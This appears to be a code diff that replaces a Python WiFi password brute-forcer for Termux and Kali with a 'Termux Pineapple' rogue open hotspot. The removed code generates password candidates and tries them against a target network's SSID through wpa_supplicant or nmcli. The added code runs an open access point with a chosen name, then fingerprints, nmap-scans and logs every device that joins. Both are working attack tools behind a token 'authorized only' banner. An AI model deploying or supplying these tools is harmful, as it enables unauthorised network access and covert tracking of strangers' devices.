@@ -1,518 +1,443 @@
 #!/usr/bin/env python3
 """
-WiFi Brute Force Tool - Rootless | Termux & Kali Compatible
-Authorized Pentesting Only - Smart Auto Password Generator
-Generates all combinations on the fly (numbers, letters, symbols, mixed)
+Termux Pineapple - Open Hotspot with Device Monitoring
+For authorized security assessments only.
 """
 
 import os
 import sys
 import time
-import re
-import itertools
-import string
 import json
 import subprocess
 import threading
-import queue
-import shutil
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import signal
+import re
 from datetime import datetime
 
 # ============================================================
-# CONFIGURATION - Tweak these
+# CONFIGURATION
 # ============================================================
+AP_IFACE = "wlan0"         # Physical WiFi interface
+AP_IP = "192.168.4.1"      # IP for the AP interface
+AP_NET = "192.168.4"       # Subnet
+AP_MASK = "255.255.255.0"
+AP_CHANNEL = "6"
 
-MIN_LEN = 4        # Minimum password length to try
-MAX_LEN = 8        # Maximum password length to try
-THREADS = 15       # Parallel threads
-BATCH_SIZE = 30    # Passwords per batch submission
-MAX_PASSWORDS = 100000  # Safety limit (change or set to None for unlimited)
-
-# Character sets
-NUMBERS = string.digits
-LOWERCASE = string.ascii_lowercase
-UPPERCASE = string.ascii_uppercase
-LETTERS = string.ascii_letters
-SYMBOLS = "!@#$%^&*()_+-=[]{}|;':\",./<>?~`"
-ALL_CHARS = LETTERS + NUMBERS + SYMBOLS
+# Files
+HOSTAPD_CONF = "/data/data/com.termux/files/home/hostapd.conf"
+DNSMASQ_CONF = "/data/data/com.termux/files/home/dnsmasq.conf"
+KNOWN_DEVICES_FILE = "/data/data/com.termux/files/home/.pineapple_known.json"
 
 # ============================================================
-# ENVIRONMENT DETECTION
+# BANNER
 # ============================================================
-
-class Environment:
-    """Auto-detect whether we're on Termux, Kali, or other Linux"""
-    
-    @staticmethod
-    def detect():
-        if 'TERMUX_VERSION' in os.environ or 'com.termux' in __file__:
-            return 'termux'
-        
-        try:
-            with open('/etc/os-release') as f:
-                content = f.read().lower()
-            if 'kali' in content:
-                return 'kali'
-        except:
-            pass
-        
-        try:
-            result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
-            if 'kali' in result.stdout.lower():
-                return 'kali'
-        except:
-            pass
-        
-        return 'linux'
-
-    @staticmethod
-    def check_dependencies(env):
-        """Check which WiFi tools are available"""
-        tools = {}
-        
-        # Common tools
-        for tool in ['iw', 'wpa_supplicant', 'wpa_cli', 'nmcli', 'iwconfig']:
-            tools[tool] = shutil.which(tool) is not None
-        
-        # Termux-specific
-        tools['termux-wifi-scaninfo'] = shutil.which('termux-wifi-scaninfo') is not None
-        tools['termux-wifi-connectioninfo'] = shutil.which('termux-wifi-connectioninfo') is not None
-        
-        # Python modules
-        try:
-            import wifi
-            tools['pywifi'] = True
-        except ImportError:
-            tools['pywifi'] = False
-        
-        return tools
-
-# ============================================================
-# SMART PASSWORD GENERATOR
-# ============================================================
-
-def generate_passwords_smart(max_count=500000):
-    """
-    Smart password generator - ordered by likelihood.
-    Creates combinations on the fly, no external wordlist needed.
-    """
-    count = 0
-    
-    # ---- STAGE 1: Pure Numeric (most common WiFi passwords) ----
-    # Start with short lengths first
-    for length in range(4, 11):
-        for combo in itertools.product(NUMBERS, repeat=length):
-            yield ''.join(combo)
-            count += 1
-            if max_count and count >= max_count:
-                return
-    
-    # ---- STAGE 2: Common words + number suffixes ----
-    common_bases = [
-        'password', 'admin', 'wifi', 'guest', 'home', 'default',
-        'linksys', 'net', 'family', 'mobile', 'hotel', 'free',
-        '1234', 'arris', 'belkin', 'dlink', 'tp', 'tplink',
-        'internet', 'access', 'router', 'secure', 'private'
-    ]
-    suffixes = ['', '1', '12', '123', '1234', '12345', '!', '@', '#',
-                '2024', '2025', '2026', '01', '007', '69', '420']
-    
-    for base in common_bases:
-        for suffix in suffixes:
-            pwd = base + suffix
-            if len(pwd) >= MIN_LEN:
-                yield pwd
-                count += 1
-                if max_count and count >= max_count:
-                    return
-    
-    # ---- STAGE 3: Lowercase letters only ----
-    for length in range(5, 10):
-        for combo in itertools.product(LOWERCASE, repeat=length):
-            yield ''.join(combo)
-            count += 1
-            if max_count and count >= max_count:
-                return
-    
-    # ---- STAGE 4: Lowercase + numbers ----
-    alphanum = LOWERCASE + NUMBERS
-    for length in range(6, 10):
-        for combo in itertools.product(alphanum, repeat=length):
-            yield ''.join(combo)
-            count += 1
-            if max_count and count >= max_count:
-                return
-    
-    # ---- STAGE 5: Mixed case + numbers ----
-    mix = LOWERCASE + UPPERCASE + NUMBERS
-    for length in range(6, 9):
-        for combo in itertools.product(mix, repeat=length):
-            yield ''.join(combo)
-            count += 1
-            if max_count and count >= max_count:
-                return
-    
-    # ---- STAGE 6: Full charset (letters + numbers + symbols) ----
-    for length in range(6, 9):
-        for combo in itertools.product(ALL_CHARS, repeat=length):
-            yield ''.join(combo)
-            count += 1
-            if max_count and count >= max_count:
-                return
-
-
-# ============================================================
-# WIFI CONNECTION BACKENDS
-# ============================================================
-
-class TermuxWiFiBackend:
-    """Rootless WiFi control via Termux API"""
-    
-    def __init__(self):
-        self.enabled = (
-            shutil.which('termux-wifi-scaninfo') is not None
-        )
-    
-    def scan(self):
-        """Scan networks using termux-wifi-scaninfo"""
-        try:
-            result = subprocess.run(
-                ['termux-wifi-scaninfo'],
-                capture_output=True, text=True, timeout=15
-            )
-            if result.returncode == 0:
-                networks = json.loads(result.stdout)
-                return [
-                    {'ssid': n.get('ssid', ''), 'bssid': n.get('bssid', ''),
-                     'capabilities': n.get('capabilities', '')}
-                    for n in networks if n.get('ssid')
-                ]
-        except:
-            pass
-        return []
-    
-    def try_password(self, ssid, password):
-        """Attempt connection via termux-wifi-connectioninfo after setting up wpa_supplicant"""
-        # Create a temporary wpa_supplicant config
-        config_content = f"""ctrl_interface=/data/data/com.termux/files/usr/var/run/wpa_supplicant
-update_config=1
-network={{
-    ssid="{ssid}"
-    psk="{password}"
-    key_mgmt=WPA-PSK
-}}
+BANNER = r"""
+    ________  ___
+   /  _/ __ \/   \   Termux Pineapple
+   / // /_/ / /| |   Open Hotspot Monitor
+ _/__/ .___/ ___ |   Authorized Pentest Tool
+  /_/_/     /_/  |_|
+  v1.0 - No Password AP + Client Tracking
 """
-        config_path = "/data/data/com.termux/files/usr/etc/wpa_supplicant/wpa_supplicant.conf"
-        os.makedirs(os.path.dirname(config_path), exist_ok=True)
-        
+
+# ============================================================
+# UTILITY FUNCTIONS
+# ============================================================
+
+def run_cmd(cmd, timeout=10):
+    """Run a shell command and return (returncode, stdout, stderr)."""
+    try:
+        proc = subprocess.Popen(
+            cmd, shell=True,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            text=True
+        )
+        stdout, stderr = proc.communicate(timeout=timeout)
+        return proc.returncode, stdout.strip(), stderr.strip()
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        return -1, "", "Timeout"
+    except Exception as e:
+        return -1, "", str(e)
+
+
+def check_root():
+    """Check if we have root (required for hostapd)."""
+    ret, out, err = run_cmd("id -u")
+    if ret == 0 and out == "0":
+        return True
+    # Also try tsu
+    ret, out, err = run_cmd("command -v tsu")
+    if ret == 0:
+        return True
+    return False
+
+
+def check_deps():
+    """Check that required packages are installed."""
+    deps = {
+        "hostapd": "pkg install hostapd",
+        "dnsmasq": "pkg install dnsmasq",
+        "python": "pkg install python",
+    }
+    if not os.path.exists("/system/bin/ip") and not os.path.exists("/system/xbin/ip"):
+        deps["tsu (or root)"] = "pkg install tsu"
+    
+    missing = []
+    for dep, install_cmd in deps.items():
+        ret, out, err = run_cmd(f"command -v {dep.split()[0]}")
+        if ret != 0:
+            missing.append((dep, install_cmd))
+    
+    return missing
+
+
+def get_mac_vendor(mac):
+    """Look up MAC vendor using the OUI database."""
+    oui = mac.upper().replace(":", "")[:6]
+    
+    # Built-in common OUI database (compact)
+    vendors = {
+        "00037F": "Samsung", "0015E9": "Apple", "0016CB": "Apple",
+        "001B63": "Apple", "001D4F": "Apple", "0021E9": "Apple",
+        "002272": "Apple", "0023DF": "Apple", "0025BC": "Apple",
+        "0026B0": "Apple", "0027B0": "Apple", "0028B0": "Apple",
+        "003065": "Apple", "0030B0": "Apple", "0050F2": "Microsoft",
+        "0050B0": "Intel", "00A0C9": "Intel", "000C29": "VMware",
+        "005056": "VMware", "000569": "VMware", "001C42": "HTC",
+        "00A0C6": "Cisco", "001B54": "Cisco", "000F66": "Cisco",
+        "00155D": "ASUS", "001E8C": "ASUS", "000625": "Dell",
+        "0018F3": "Dell", "001B78": "HP", "002481": "HP",
+        "00037F": "Samsung", "001EE6": "Samsung", "002618": "Samsung",
+        "00A091": "Nokia", "0021FE": "Nokia", "001D0F": "LG",
+        "001A80": "LG", "001E10": "LG", "002181": "OnePlus",
+        "002512": "Xiaomi", "00A050": "Xiaomi", "0018D1": "Sony",
+        "00259E": "Sony", "0011B8": "Huawei", "001857": "Huawei",
+        "0025A0": "Huawei", "00187A": "Motorola", "001E39": "Motorola",
+        "000C6E": "Raspberry Pi", "B827EB": "Raspberry Pi",
+        "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi",
+        "000ED1": "Google/Nest", "001A11": "Google",
+        "A885B2": "Google", "2462AB": "Amazon", "AC63BE": "Amazon",
+        "74C246": "Amazon", "0017C8": "Netgear", "A021B7": "Netgear",
+        "001E2A": "Netgear", "0023CD": "TP-Link", "50C7BF": "TP-Link",
+        "14CFE2": "TP-Link", "00B0D0": "D-Link", "0015E9": "D-Link",
+        "5C4979": "Ubiquiti", "00192F": "Ubiquiti", "00156D": "Ubiquiti",
+        "F0B429": "Ubiquiti", "DCA632": "Espressif", "24B6FD": "Espressif",
+        "ECFA00": "Espressif", "001583": "BlackBerry", "0001E6": "Acer",
+        "0021C5": "Acer", "0019B9": "Lenovo", "0018FE": "Lenovo",
+        "F8A963": "NVIDIA", "0018DE": "Microsoft/Xbox",
+        "002622": "Fitbit", "0016A4": "Belkin", "009091": "Belkin",
+    }
+    
+    return vendors.get(oui, "Unknown")
+
+
+def get_hostname_from_lease(ip):
+    """Try to get hostname from dnsmasq lease file."""
+    lease_file = "/data/data/com.termux/files/home/dnsmasq.leases"
+    if os.path.exists(lease_file):
         try:
-            with open(config_path, 'w') as f:
-                f.write(config_content)
-            
-            # Try using iw to connect (rootless if nl80211 available)
-            result = subprocess.run(
-                ['wpa_supplicant', '-B', '-i', 'wlan0',
-                 '-c', config_path, '-f', '/dev/null'],
-                capture_output=True, text=True, timeout=5
-            )
-            time.sleep(1.5)
-            
-            # Check connection
-            status = subprocess.run(
-                ['wpa_cli', 'status'],
-                capture_output=True, text=True, timeout=3
-            )
-            
-            # Cleanup
-            subprocess.run(['wpa_cli', 'terminate'], capture_output=True, timeout=3)
-            subprocess.run(['pkill', '-f', 'wpa_supplicant'], capture_output=True, timeout=2)
-            
-            if 'wpa_state=COMPLETED' in status.stdout:
-                return True, password
+            with open(lease_file, "r") as f:
+                for line in f:
+                    parts = line.strip().split()
+                    if len(parts) >= 4 and parts[2] == ip:
+                        return parts[3]  # hostname
         except:
             pass
-        return False, password
+    return None
 
 
-class KaliWiFiBackend:
-    """For Kali Linux with NetworkManager (nmcli)"""
+def get_device_info(ip, mac):
+    """Gather as much info as possible about a connected device."""
+    info = {
+        "ip": ip,
+        "mac": mac,
+        "vendor": get_mac_vendor(mac),
+        "hostname": get_hostname_from_lease(ip) or "Unknown",
+        "first_seen": datetime.now().strftime("%H:%M:%S"),
+        "last_seen": datetime.now().strftime("%H:%M:%S"),
+    }
     
-    def __init__(self):
-        self.nmcli = shutil.which('nmcli')
+    # Try reverse DNS lookup
+    ret, out, err = run_cmd(f"nslookup {ip} 2>/dev/null | grep 'name =' | awk '{{print $4}}'")
+    if out:
+        info["hostname"] = out.rstrip(".")
     
-    def scan(self):
-        """Scan using nmcli"""
-        if not self.nmcli:
-            return []
+    # Try to get NetBIOS name
+    ret, out, err = run_cmd(f"nmblookup -A {ip} 2>/dev/null | grep '<00>' | head -1 | awk '{{print $1}}'")
+    if out and out != ip:
+        info["hostname"] = out
+    
+    return info
+
+
+# ============================================================
+# HOTSPOT MANAGEMENT
+# ============================================================
+
+def generate_hostapd_conf(ssid, iface=AP_IFACE, channel=AP_CHANNEL):
+    """Generate hostapd.conf for an open (no password) AP."""
+    conf = f"""interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=0
+"""
+    with open(HOSTAPD_CONF, "w") as f:
+        f.write(conf)
+    print(f"[+] hostapd config written: SSID='{ssid}' (open, ch{channel})")
+
+
+def generate_dnsmasq_conf():
+    """Generate dnsmasq.conf for DHCP on AP network."""
+    conf = f"""interface=ap0
+dhcp-range={AP_NET}.2,{AP_NET}.100,255.255.255.0,24h
+dhcp-option=3,{AP_IP}
+dhcp-option=6,{AP_IP}
+dhcp-leasefile=/data/data/com.termux/files/home/dnsmasq.leases
+log-dhcp
+bind-interfaces
+"""
+    with open(DNSMASQ_CONF, "w") as f:
+        f.write(conf)
+    print("[+] dnsmasq config written")
+
+
+def interface_up(iface, ip):
+    """Bring up an interface with IP."""
+    run_cmd(f"ip link set {iface} up")
+    run_cmd(f"ip addr add {ip}/24 dev {iface}")
+    print(f"[+] Interface {iface} up at {ip}")
+
+
+def start_hotspot():
+    """Start hostapd and dnsmasq processes."""
+    print("[*] Starting hostapd...")
+    proc_h = subprocess.Popen(
+        ["hostapd", HOSTAPD_CONF],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    
+    print("[*] Starting dnsmasq...")
+    proc_d = subprocess.Popen(
+        ["dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    # Actually run dnsmasq as daemon
+    run_cmd(f"dnsmasq -C {DNSMASQ_CONF}")
+    
+    return proc_h
+
+
+def stop_hotspot(proc_h=None):
+    """Kill AP processes and clean up."""
+    print("\n[*] Stopping hotspot...")
+    if proc_h:
+        proc_h.terminate()
+    run_cmd("killall hostapd 2>/dev/null")
+    run_cmd("killall dnsmasq 2>/dev/null")
+    run_cmd(f"ip link set ap0 down 2>/dev/null")
+    run_cmd(f"ip addr flush dev ap0 2>/dev/null")
+    # Restore WiFi
+    run_cmd(f"ip link set {AP_IFACE} down 2>/dev/null")
+    time.sleep(0.5)
+    run_cmd(f"ip link set {AP_IFACE} up 2>/dev/null")
+    print("[+] Cleanup done")
+
+
+# ============================================================
+# DEVICE MONITORING
+# ============================================================
+
+def scan_arp():
+    """Parse /proc/net/arp to find connected devices."""
+    devices = {}
+    try:
+        with open("/proc/net/arp", "r") as f:
+            lines = f.readlines()
+        for line in lines[1:]:  # skip header
+            parts = line.split()
+            if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
+                ip = parts[0]
+                mac = parts[3]
+                if ip.startswith(AP_NET):
+                    devices[mac] = ip
+    except:
+        pass
+    return devices
+
+
+def scan_subnet():
+    """ARP scan the subnet for active devices."""
+    devices = {}
+    from scapy.all import ARP, Ether, srp
+    try:
+        arp = ARP(pdst=f"{AP_NET}.0/24")
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether / arp
+        answered = srp(packet, timeout=2, iface="ap0", verbose=False)[0]
+        for sent, recv in answered:
+            devices[recv.hwsrc] = recv.psrc
+    except:
+        pass
+    return devices
+
+
+def monitor_devices(interval=2):
+    """Continuously monitor for new devices on the AP."""
+    seen_devices = {}
+    known_devices = {}
+    
+    # Load known devices cache
+    if os.path.exists(KNOWN_DEVICES_FILE):
         try:
-            result = subprocess.run(
-                ['nmcli', '-t', '-f', 'SSID,BSSID,SECURITY', 'dev', 'wifi', 'list'],
-                capture_output=True, text=True, timeout=15
-            )
-            networks = []
-            for line in result.stdout.strip().split('\n'):
-                if line:
-                    parts = line.split(':')
-                    if len(parts) >= 2:
-                        networks.append({
-                            'ssid': parts[0],
-                            'bssid': parts[1] if len(parts) > 1 else '',
-                            'capabilities': parts[2] if len(parts) > 2 else ''
-                        })
-            return networks
-        except:
-            return []
-    
-    def try_password(self, ssid, password):
-        """Try password using nmcli"""
-        if not self.nmcli:
-            return False, password
-        
-        try:
-            # Remove any existing connection for this SSID
-            subprocess.run(
-                ['nmcli', 'connection', 'delete', f'wifi-{ssid}'],
-                capture_output=True, timeout=5
-            )
-            
-            result = subprocess.run(
-                ['nmcli', 'device', 'wifi', 'connect', ssid,
-                 'password', password, '--timeout', '5'],
-                capture_output=True, text=True, timeout=8
-            )
-            
-            if result.returncode == 0 and 'successfully' in result.stdout.lower():
-                # Cleanup
-                subprocess.run(
-                    ['nmcli', 'connection', 'delete', f'wifi-{ssid}'],
-                    capture_output=True, timeout=5
-                )
-                return True, password
+            with open(KNOWN_DEVICES_FILE, "r") as f:
+                known_devices = json.load(f)
         except:
             pass
-        return False, password
-
-
-# ============================================================
-# MAIN CRACKER
-# ============================================================
-
-class WiFiCracker:
-    def __init__(self):
-        self.env = Environment.detect()
-        self.tools = Environment.check_dependencies(self.env)
-        
-        print(f"[*] Detected environment: {self.env.upper()}")
-        print(f"[*] Tools available: {', '.join(k for k,v in self.tools.items() if v)}")
-        
-        # Auto-select backend
-        if self.env == 'termux' and self.tools.get('termux-wifi-scaninfo'):
-            self.backend = TermuxWiFiBackend()
-        elif self.tools.get('nmcli'):
-            self.backend = KaliWiFiBackend()
-        else:
-            print("[!] No compatible WiFi backend found!")
-            print("    Termux: Install 'termux-api' package and termux:API app")
-            print("    Kali:   Use 'apt install network-manager'")
-            sys.exit(1)
-        
-        self.found = False
-        self.password = None
-        self.attempts = 0
-        self.start_time = None
-        self.lock = threading.Lock()
     
-    def scan_networks(self):
-        """Scan and display available networks"""
-        print("\n[*] Scanning for WiFi networks...")
-        networks = self.backend.scan()
-        
-        if not networks:
-            print("[!] No networks found or scan failed")
-            return []
-        
-        print(f"\n  {'#':>3} | {'SSID':<30} | {'BSSID':<20}")
-        print(f"  {'-'*3}-+-{'-'*30}-+-{'-'*20}")
-        
-        for i, net in enumerate(networks[:30]):
-            ssid = net['ssid'][:28] if net['ssid'] else '<hidden>'
-            bssid = net.get('bssid', 'N/A')[:17]
-            print(f"  {i+1:>3} | {ssid:<30} | {bssid:<20}")
-        
-        return networks
+    print(f"\n{'='*65}")
+    print(f"{'[*] MONITORING FOR CONNECTED DEVICES...':^65}")
+    print(f"{'[*] Press Ctrl+C to stop hotspot':^65}")
+    print(f"{'='*65}\n")
     
-    def try_password_batch(self, ssid, batch, results_queue):
-        """Thread worker - tries a batch of passwords"""
-        for pwd in batch:
-            if self.found:
-                return
+    try:
+        while True:
+            # Get current MACs on the AP network
+            current_arp = scan_arp()
+            current_scan = scan_subnet() if not current_arp else {}
             
-            with self.lock:
-                self.attempts += 1
+            # Merge: ARP file first, live scan as fallback
+            all_current = {**current_scan, **current_arp}
             
-            success, found_pwd = self.backend.try_password(ssid, pwd)
-            if success:
-                self.found = True
-                self.password = found_pwd
-                results_queue.put(('FOUND', found_pwd))
-                return
-    
-    def crack(self, ssid, max_passwords=100000):
-        """Main cracking loop"""
-        self.start_time = time.time()
-        
-        print(f"\n{'='*60}")
-        print(f"  TARGET     : {ssid}")
-        print(f"  ENVIRONMENT: {self.env.upper()}")
-        print(f"  MODE       : Auto-generate passwords (smart order)")
-        print(f"  MAX TRIES  : {max_passwords if max_passwords else 'Unlimited'}")
-        print(f"  THREADS    : {THREADS}")
-        print(f"{'='*60}\n")
-        
-        # Generate passwords
-        pwd_gen = generate_passwords_smart(max_passwords)
-        
-        # Setup threading
-        results_queue = queue.Queue()
-        batch = []
-        total_sent = 0
-        speed_samples = []
-        
-        # Speed monitor thread
-        def monitor():
-            while not self.found:
-                time.sleep(3)
-                elapsed = time.time() - self.start_time
-                with self.lock:
-                    rate = self.attempts / elapsed if elapsed > 0 else 0
-                    progress = (self.attempts / max_passwords * 100) if max_passwords else 0
-                    eta = (max_passwords - self.attempts) / rate if rate > 0 else 0
+            for mac, ip in all_current.items():
+                if mac not in seen_devices and mac != "00:00:00:00:00:00":
+                    # NEW DEVICE DETECTED!
+                    info = get_device_info(ip, mac)
+                    seen_devices[mac] = info
+                    known_devices[mac] = info
                     
-                    print(f"  [RUN] {self.attempts:,} tries | "
-                          f"{rate:.1f} pwd/s | "
-                          f"{progress:.1f}% | "
-                          f"ETA: {eta:.0f}s", end='\r')
-        
-        monitor_thread = threading.Thread(target=monitor, daemon=True)
-        monitor_thread.start()
-        
-        # Main loop - submit batches to thread pool
-        with ThreadPoolExecutor(max_workers=THREADS) as executor:
-            futures = []
-            
-            for pwd in pwd_gen:
-                if self.found:
-                    break
-                
-                batch.append(pwd)
-                total_sent += 1
-                
-                if len(batch) >= BATCH_SIZE:
-                    futures.append(
-                        executor.submit(
-                            self.try_password_batch, ssid, batch, results_queue
-                        )
-                    )
-                    batch = []
+                    # Save to known devices
+                    try:
+                        with open(KNOWN_DEVICES_FILE, "w") as f:
+                            json.dump(known_devices, f, indent=2)
+                    except:
+                        pass
                     
-                    # Check results without blocking
-                    while not results_queue.empty():
-                        status, result = results_queue.get()
-                        if status == 'FOUND':
-                            self.found = True
-                            break
+                    # Print alert
+                    print(f"\n{'!'*60}")
+                    print(f"  [NEW DEVICE CONNECTED]")
+                    print(f"  Time:     {info['first_seen']}")
+                    print(f"  IP:       {info['ip']}")
+                    print(f"  MAC:      {info['mac']}")
+                    print(f"  Vendor:   {info['vendor']}")
+                    print(f"  Hostname: {info['hostname']}")
+                    
+                    # Try to get additional device info
+                    # Check if device has ports open
+                    ret, out, err = run_cmd(f"nmap -sn {ip} 2>/dev/null | grep -E 'Host is up|MAC'")
+                    if out:
+                        print(f"  Scanning:  {out[:60]}")
+                    
+                    print(f"{'!'*60}\n")
+                
+                elif mac in seen_devices:
+                    # Update last seen
+                    seen_devices[mac]["last_seen"] = datetime.now().strftime("%H:%M:%S")
             
-            # Don't forget the last partial batch
-            if batch and not self.found:
-                futures.append(
-                    executor.submit(
-                        self.try_password_batch, ssid, batch, results_queue
-                    )
-                )
+            # Check for disconnected devices
+            for mac in list(seen_devices.keys()):
+                if mac not in all_current:
+                    info = seen_devices[mac]
+                    print(f"  [-] Device DISCONNECTED: {info['ip']} ({info['vendor']} - {info['mac']})")
+                    del seen_devices[mac]
             
-            # Wait for remaining
-            for future in as_completed(futures):
-                if self.found:
-                    break
-        
-        # Done
-        elapsed = time.time() - self.start_time
-        rate = self.attempts / elapsed if elapsed > 0 else 0
-        
-        print("\n" + "="*60)
-        if self.found:
-            print(f"\n  ✅ PASSWORD FOUND!")
-            print(f"  ┌─────────────────────────────────────────────┐")
-            print(f"  │  Password : {self.password:<35}│")
-            print(f"  │  Tries    : {self.attempts:<8,}                      │")
-            print(f"  │  Time     : {elapsed:<8.1f}s                      │")
-            print(f"  │  Speed    : {rate:<8.1f} pwd/s                   │")
-            print(f"  └─────────────────────────────────────────────┘")
-        else:
-            print(f"\n  ❌ Password NOT FOUND in {self.attempts:,} attempts")
-            print(f"  Time: {elapsed:.1f}s | Rate: {rate:.1f} pwd/s")
-            print(f"  Tip: Increase MAX_LEN or expand character sets")
-        
-        print("="*60 + "\n")
-        return self.password
+            # Show summary
+            if seen_devices:
+                print(f"\r  [ACTIVE: {len(seen_devices)} device(s)]   Last check: {datetime.now().strftime('%H:%M:%S')}", end="")
+                sys.stdout.flush()
+            
+            time.sleep(interval)
+            
+    except KeyboardInterrupt:
+        print("\n\n[*] Monitoring stopped.")
 
 
 # ============================================================
-# MAIN ENTRY POINT
+# MAIN
 # ============================================================
 
 def main():
-    print("""
-╔══════════════════════════════════════════════════════════╗
-║           WiFi BRUTE FORCE - Rootless Edition            ║
-║     Smart Password Generator - No Wordlist Needed        ║
-║     Works on: Termux | Kali | Linux                      ║
-║     Authorized Pentesting Only                           ║
-╚══════════════════════════════════════════════════════════╝
-    """)
+    print(BANNER)
+    print(f"{'='*60}")
+    print(f"{'Authorized Security Assessment Tool':^60}")
+    print(f"{'Use only on systems you own or have permission to test.':^60}")
+    print(f"{'='*60}\n")
     
-    cracker = WiFiCracker()
-    
-    # Scan or manual SSID
-    print("[1] Scan for nearby networks")
-    print("[2] Enter SSID manually")
-    choice = input("\nSelect (1/2): ").strip()
-    
-    ssid = None
-    
-    if choice == '1':
-        networks = cracker.scan_networks()
-        if networks:
-            try:
-                sel = int(input("\nSelect network number: "))
-                ssid = networks[sel - 1]['ssid']
-            except (ValueError, IndexError):
-                print("[!] Invalid selection")
-                ssid = input("Enter SSID manually: ").strip()
-        else:
-            print("[!] No networks found")
-            ssid = input("Enter SSID manually: ").strip()
-    elif choice == '2':
-        ssid = input("Enter target SSID: ").strip()
-    else:
-        print("[!] Invalid option")
+    # Check root
+    if not check_root():
+        print("[!] Root access required. Run with:")
+        print("    $ tsu")
+        print("    $ python3 pineapple.py")
         sys.exit(1)
     
+    # Check dependencies
+    missing = check_deps()
+    if missing:
+        print("[!] Missing dependencies:")
+        for dep, cmd in missing:
+            print(f"    - {dep}  ->  {cmd}")
+        sys.exit(1)
+    
+    # Get SSID
+    ssid = input("[?] Enter hotspot SSID (default: 'Pineapple_AP'): ").strip()
     if not ssid:
-        print("[!] No SSID provided")
-        sys.exit(1)
+        ssid = "Pineapple_AP"
     
-    # Max passwords
-    max_input = input(f"Max passwords to try [default {MAX_PASSWORDS:,}]: ").strip()
-    max_pwd = int(max_input) if max_input.isdigit() else MAX_PASSWORDS
+    print(f"\n[*] Setting up hotspot '{ssid}'...")
     
-    cracker.crack(ssid, max_pwd)
+    try:
+        # Step 1: Create virtual AP interface
+        print("[*] Creating virtual AP interface (ap0)...")
+        run_cmd(f"iw dev {AP_IFACE} interface add ap0 type __ap")
+        time.sleep(0.5)
+        
+        # Step 2: Configure and bring up ap0
+        interface_up("ap0", AP_IP)
+        
+        # Step 3: Generate configs
+        generate_hostapd_conf(ssid)
+        generate_dnsmasq_conf()
+        
+        # Step 4: Enable IP forwarding (optional, for internet sharing)
+        run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        
+        # Step 5: Start hotspot
+        proc_h = start_hotspot()
+        time.sleep(2)
+        
+        print(f"\n[+] Hotspot is LIVE!")
+        print(f"    SSID:     {ssid}")
+        print(f"    Security: OPEN (no password)")
+        print(f"    IP Range: {AP_NET}.2 - {AP_NET}.100")
+        print(f"    Gateway:  {AP_IP}")
+        print(f"    Channel:  {AP_CHANNEL}")
+        
+        # Step 6: Monitor for devices
+        monitor_devices()
+        
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        print(f"\n[!] Error: {e}")
+    finally:
+        stop_hotspot() if 'proc_h' in locals() else None
+        print("\n[+] Hotspot terminated. Goodbye.")
 
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n\n[!] Interrupted by user. Exiting...")
-        sys.exit(0)
+    main()
